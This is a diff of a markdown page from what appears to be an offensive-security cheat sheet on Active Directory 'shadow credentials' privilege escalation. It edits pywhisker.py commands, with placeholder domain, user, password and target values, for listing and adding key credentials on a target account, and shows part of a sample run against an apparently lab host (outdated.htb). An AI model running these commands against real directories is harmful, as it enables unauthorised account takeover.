@@ -6,14 +6,14 @@ tags: ["Shadow Credentials", "Pass-The-Cert", "AddkeyCredentialLink", "Active Di
 
 ### Privesc #1: Shadow credentials
 
-{{< tab set1 tab1 active >}}Linux{{< /tab >}}
+{{< tab set1 tab1 >}}Linux{{< /tab >}}
 {{< tab set1 tab2 >}}Windows{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
 #### 0. Pre-check \[optional\]
 
 ```console
-python3 pywhisker.py --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps
+python3 pywhisker.py -t '<TARGET_USER>' --action list -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> --use-ldaps
 ```
 
 ```console {class="sample-code"}
@@ -26,7 +26,7 @@ $ python3 pywhisker.py --action list -d outdated.htb -u 'btables' -p '5myBPLPDKT
 #### 1. Add shadow credentials
 
 ```console
-python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC> -t '<TARGET_USER>' --use-ldaps
+python3 pywhisker.py --action add -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --dc-ip <DC_IP> -t '<TARGET_USER>' --use-ldaps
 ```
 
 ```console {class="sample-code"}
